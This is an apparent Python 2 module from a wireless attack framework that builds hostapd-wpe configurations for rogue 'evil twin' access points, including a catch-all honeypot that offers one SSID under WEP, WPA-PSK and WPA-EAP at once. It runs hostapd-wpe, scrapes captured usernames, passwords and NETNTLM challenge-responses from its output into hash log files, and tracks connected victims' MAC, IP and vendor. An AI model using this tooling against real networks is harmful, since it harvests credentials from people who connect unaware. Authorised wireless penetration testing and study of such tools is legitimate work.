import os
import pyric.pyw as pyw
from etfexceptions import InvalidConfigurationException
from netaddr import EUI, OUI
from subprocess import Popen, PIPE, check_output
from textwrap import dedent
from threading import Thread
from utils.utils import FileHandler, NetUtils, DEVNULL 
from time import sleep

class APLauncher(object):

	def __init__(self, hostapd_config_path):
		self.hostapd_config_path = hostapd_config_path

		self.ap_running = False
		self.ap_process = None
		self.credential_printer = None

		self.connected_clients_updator = None
		self.connected_clients = {}	# interface: client_list

		self.hostapd_output_parser = None

		self.file_handler = None
		self.print_creds = False

	def write_hostapd_configurations(self,  interface="wlan0", 
											ssid=None, 
											bssid=None, 
											channel="1", 
											hw_mode="g", 
											encryption="OPN", 
											auth="PSK", 
											cipher="CCMP", 
											password=None,
											catch_all_honeypot=False):
		self.cleanup()

		try:
			self.file_handler = FileHandler(self.hostapd_config_path, backup=False)
		except Exception as e:
			print e
			return False

		ssids		= None
		encryptions	= None
		auths		= None
		passwords	= None

		ssids, encryptions, auths, passwords = self._parse_configs(ssid, encryption, auth, password)
		if ssids:
			ssid, encryption, auth, password = ssids[0], encryptions[0], auths[0], passwords[0]

		configurations = dedent("""
								interface={interface}
								ssid={ssid}
								driver=nl80211
								channel={channel}
								hw_mode={hw_mode}
								ignore_broadcast_ssid=0
								""".format( interface=interface,
											ssid=ssid,
											channel=channel,
											hw_mode=hw_mode))

		if catch_all_honeypot:
			configurations = self.get_catch_all_honeypot_configurations(configurations, interface, ssid, bssid)
		else:
			configurations = self.get_multiple_ssid_configurations(	configurations, interface, bssid, ssids, 
																	encryptions, auths, cipher, passwords)

		self.file_handler.write(configurations)
		return True

	def get_catch_all_honeypot_configurations(self, configurations, interface, ssid, bssid):
		# hostapd can automatically create sub bssids if last bytes are set to 0
		if bssid:
			bssid = bssid[:-1] + "0"
			configurations += "bssid={bssid}\n".format(bssid=bssid) + "\n"

		# Adding WEP configurations
		configurations += "bss={}_0\n".format(interface)
		configurations += "ssid={}\n".format(ssid)
		configurations += self._get_wep_configurations("12345") + "\n"

		# Adding WPA-PSK configurations
		configurations += "bss={}_1\n".format(interface)
		configurations += "ssid={}\n".format(ssid)
		configurations += self._get_wpa_configurations("wpa/wpa2", "PSK", "CCMP", "12345678") + "\n"

		# Adding WPA-EAP configurations
		configurations += "bss={}_2\n".format(interface)
		configurations += "ssid={}\n".format(ssid)
		configurations += self._get_wpa_configurations("wpa/wpa2", "EAP", "CCMP", None) + "\n"

		return configurations

	def get_multiple_ssid_configurations(self, 	configurations, 
												interface,
												bssid=None,
												ssids=[],
												encryptions=[], 
												auths=[], 
												cipher="CCMP", 
												passwords=[]):
		# hostapd can automatically create sub bssids if last bytes are set to 0
		if bssid:
			bssid = bssid[:-1] + "0"
			configurations += "bssid={bssid}\n".format(bssid=bssid) + "\n"

		ssid_encryption = []
		if len(ssids) == len(encryptions) == len(auths) == len(passwords):
			ssid_encryption = zip(ssids, encryptions, auths, passwords)
		else:
			for ssid in ssids:
				ssid_encryption.append((ssid, encryptions[0], auths[0], passwords[0]))

		if ssid_encryption:
			counter = 0
			for ssid, encryption, auth, password in ssid_encryption:
				#print ssid, encryption, auth, password

				if counter > 0:
					configurations += "bss={}_{}\n".format(interface, counter-1)
					configurations += "ssid={}\n".format(ssid)

				if "opn" in encryption.lower():
					configurations += "\n"
				elif "wep" in encryption.lower():
					if	not (len(password) == 5 or len(password) == 10 or \
						len(password) == 13 or len(password) == 16 or len(password) == 23):
						print 	"[-] Invalid WEP key length for multiple ssid hotspot: '{}'\
								\nDefaulting WEP key to '12345'".format(password)
						password = "12345"

					configurations += self._get_wep_configurations(password) + "\n"

				elif "wpa" in encryption.lower():
					if not len(password) >= 8 and "eap" not in auth.lower():
						print "[-] Invalid WPA key length: '{}'\nDefaulting to '12346578'".format(password)
						password = "12345678"

					# Forcing correct configuration so it doesnt come out WPA-WEP or something...
					if auth.lower() not in ["psk", "eap"]:
						auth = "PSK"

					configurations += self._get_wpa_configurations(encryption, auth, cipher, password) + "\n"
				counter += 1
		
		return configurations

	def _get_wep_configurations(self, password):
		configurations = ""
		if (len(password) == 5 or len(password) == 13 or len(password) == 16):
			configurations += "wep_default_key=0\n"
			configurations += "wep_key0=\"{key}\"".format(key=password)
		elif (len(password) == 10 or len(password) == 23):
			configurations += "wep_default_key=0\n"
			configurations += "wep_key0={key}\n".format(key=password)
		else:
			error_msg = "WEP key must be either 5, 13, 16 ascii charachters or 10 or 23 HEX charachters.\n"
			raise InvalidConfigurationException(error_msg)

		return configurations

	def _get_wpa_configurations(self, encryption, auth, cipher, password):
		configurations = ""
		wpa_int = 1   
		# Check if input is 'wpa/wpa2'
		if "/" in encryption:
			encryption = encryption.split("/")
			# wpa=1 -> wpa, wpa=2 -> wpa2, wpa=3 -> wpa/wpa2
			if "wpa2" in encryption:
				wpa_int += 1
			if "wpa" in encryption and "wpa2" in encryption:
				wpa_int += 1
		elif encryption == "wpa2":
			wpa_int += 1

		configurations += "wpa={wpa_int}\n".format(wpa_int=wpa_int)                 # configure wpa or wpa2
		configurations += "wpa_key_mgmt=WPA-{auth}\n".format(auth=auth.upper())     # authentication method: PSK or EAP
		configurations += "wpa_pairwise={cipher}\n".format(cipher=cipher.upper())   # cipher: CCMP or TKIP
		
		if auth.lower() == "eap":
			configurations += self._get_wpa_eap_configurations()
		else:
			configurations += self._get_and_check_wpa_password_configurations(configurations, password)

		return configurations
			

	def _get_wpa_eap_configurations(self):
		configurations =  "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user\n"
		configurations += "ca_cert=/etc/hostapd-wpe//certs/certnew.cer\n"
		configurations += "server_cert=/etc/hostapd-wpe/certs/server.crt\n"
		configurations += "private_key=/etc/hostapd-wpe/certs/server.pem\n"
		configurations += "private_key_passwd=whatever\n"
		configurations += "dh_file=/etc/hostapd-wpe/certs/dh\n"
		configurations += "eap_server=1\n"
		configurations += "eap_fast_a_id=101112131415161718191a1b1c1d1e1f\n"
		configurations += "eap_fast_a_id_info=hostapd-wpe\n"
		configurations += "eap_fast_prov=3\n"
		configurations += "ieee8021x=1\n"
		configurations += "pac_key_lifetime=604800\n"
		configurations += "pac_key_refresh_time=86400\n"
		configurations += "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\n"
		#configurations += "wpe_logfile=./data/hashes/eap_hashes{}.log\n".format(self._count_hash_captures())
		configurations += "auth_algs=3\n"
		return configurations

	def _get_and_check_wpa_password_configurations(self, configurations, password):
		if password is None: 
			raise InvalidConfigurationException("Must specify a password when choosing wpa or wpa2 encryption!\n")
		if len(password) < 8 or len(password) > 63: 
			raise InvalidConfigurationException("Specified password must have at least 8 printable digits and a maximum of 63\n")
		configurations = "wpa_passphrase={password}\n".format(password=password)   # password minimum is 8 digits
		return configurations

	def _parse_configs(self, ssid, encryption, auth, password):
		ssids, encryptions, auths, passwords = None, None, None, None
		if type(ssid) is list:
			ssids = ssid 	# Be aware of multiple ssids
		elif type(ssid) is str:
			ssids = [ssid]

		# Specify encryption for each ssid, 
		# if encryption list is different size from ssid list then it defaults to the first one
		if type(encryption) is list:
			if len(encryption) == len(ssids):
				encryptions = encryption
			else:
				encryptions = [encryption[0]]
		elif type(encryption) is str:
			encryptions = [encryption]

		# Same thing for auth suites and passwords
		if type(auth) is list:
			if len(auth) == len(encryptions):
				auths = auth
			else:
				auths = [auth[0]]

		elif type(auth) is str:
			auths = [auth]

		if type(password) is list:
			if len(password) == len(auths):
				passwords = password
			else:
				passwords = [password[0]]

		elif type(auth) is str:
			passwords = [password]

		return ssids, encryptions, auths, passwords

	def _async_cred_logging(self, log_file_path, print_creds=False):
		"""
		This method checks for credentials in hostapd-wpe output
		"""
		log_file = None
		file_open = False
		output_lines = iter(self.ap_process.stdout.readline, "")
		incoming_cred = False
		username = ""
		password = ""
		jtr_challenge_response = ""
		for line in output_lines:
			if "username:" in line:
				incoming_cred = True
				username = line.split("username:")[-1].strip()
				log_file = open(log_file_path, "a")
				file_open = True

			if "password:" in line and incoming_cred:
				incoming_cred = False
				password = line.split("password:")[-1].strip()
				cred_string = username + ":" + password + "\n"
				log_file.write(cred_string)
				if print_creds:
					print cred_string

			if "NETNTLM:" in line:
				incoming_cred = False
				jtr_challenge_response = line.split("NETNTLM:")[-1].strip()
				log_file.write(jtr_challenge_response + "\n")
				if print_creds:
					print jtr_challenge_response + "\n"

			if file_open and not incoming_cred:
				log_file.close()

		try:
			self.ap_process.stdout.close()
			log_file.close()
		except: pass

	def start_access_point(self, interface):
		print "[+] Starting hostapd background process"
		self.ap_process = Popen("hostapd-wpe -s {config_path}".format(config_path=self.hostapd_config_path).split(), 
								stdout=PIPE,
								stderr=PIPE,
								universal_newlines=True)
		self.hostapd_output_parser =  Thread(	target=self._async_cred_logging, 
												args=(	"./data/hashes/eap_hashes{}.log".format(self._count_hash_captures()), 
														self.print_creds))
		self.hostapd_output_parser.start()

		self.ap_running = True
		sleep(1)
		self.connected_clients_updator = Thread(target=self._update_connected_clients, args=(interface, ))
		self.connected_clients_updator.start()

	def stop_access_point(self, wait = True):
		if self.ap_process != None:
			print "[+] Killing hostapd background process"
			self.ap_process.send_signal(9)  # Send SIGINT to process running hostapd
			self.ap_process = None

		os.system('pkill hostapd-wpe')      # Cleanup
		self.ap_running = False
		if self.connected_clients_updator != None:
			if wait:
				self.connected_clients_updator.join()
			self.connected_clients_updator = None

	def cleanup(self):
		if self.file_handler:
			self.file_handler.restore_file()
			self.file_handler = None

	def get_connected_clients(self):
		return [client for ssid in self.connected_clients.keys() for client in self.connected_clients[ssid]]


	def _update_connected_clients(self, interface):
		fail_count = 0
		while self.ap_running:
			# Gets virtual interfaces too because their name is same as ap_interface with _<index> appended
			ap_interfaces = [iface for iface in pyw.winterfaces() if interface in iface]
			for ap_interface in ap_interfaces:
				if not self._parse_connected_clients(ap_interface):
					fail_count += 1

				
				if fail_count > 5:
					print "[-] hostapd was unable to start the access point,"
					print "check configuration file or try restarting. Stopping now."
					self.stop_access_point(wait = False)
					print "stop airhost manually to stop other services"
					break
				
			sleep(3)

	def _parse_connected_clients(self, interface):
		try:
			if not pyw.modeget(pyw.getcard(interface)) == 'AP':
				print "[-] '{}' is not on AP mode".format(interface)
				return False
		except Exception:
			return False

		client_dump = check_output("iw dev {} station dump".format(interface).split()).split('Station')
		client_dump = [ map(str.strip, client.split("\n")) for client in client_dump if interface in client ]
		ssid = NetUtils().get_ssid_from_interface(interface)
		temp_clients = []
		# At this point a client is a list of arguments to be parsed
		for client in client_dump:
			client_mac                  = client[0].split()[0].strip()
			client_name, client_ip      = NetUtils().get_ip_from_mac(interface, client_mac)
			inactivity_time             = client[1].split(":")[1].strip()
			rx_packets                  = client[3].split(":")[1].strip()
			tx_packets                  = client[5].split(":")[1].strip()
			signal                      = client[8].split(":")[1].strip()
			tx_bitrate                  = client[10].split(":")[1].strip()
			rx_bitrate                  = client[11].split(":")[1].strip()
			id = len(temp_clients)

			client = Client(id, client_name, client_mac, client_ip, ssid, inactivity_time, 
							rx_packets, tx_packets, rx_bitrate, tx_bitrate, signal)

			if client not in self.connected_clients[interface]:
				print "[+] New connected client on '{ssid}'-> ip: {ip}, mac: {mac} ({vendor})".format(
																								ssid=ssid,
																								ip=client_ip, 
																								mac=client_mac, 
																								vendor=client.vendor)
			temp_clients.append(client)

		self.connected_clients[interface] = temp_clients
		return True

	def _count_hash_captures(self):
		return len(os.listdir("data/hashes/"))



class Client(object):

	def __init__(self,  id = 0, name=None, mac_address=None, ip_address=None, 
						connected_ssid=None, inactivity_time=None,
						rx_packets=None, tx_packets=None,
						rx_bitrate=None, tx_bitrate=None, 
						signal=None):
		self.id = id
		self.name = name
		self.mac_address = mac_address
		self.ip_address = ip_address
		self.connected_ssid = connected_ssid
		self.inactivity_time = inactivity_time
		self.rx_packets = rx_packets
		self.tx_packets = tx_packets
		self.tx_bitrate = tx_bitrate
		self.rx_bitrate = rx_bitrate
		self.signal = signal
		self.vendor = None
		try:
			self.vendor = EUI(mac_address).oui.registration().org      # OUI - Organizational Unique Identifier
		except Exception as e:
			pass

	def __eq__(self, other):
		return (self.mac_address == other.mac_address)
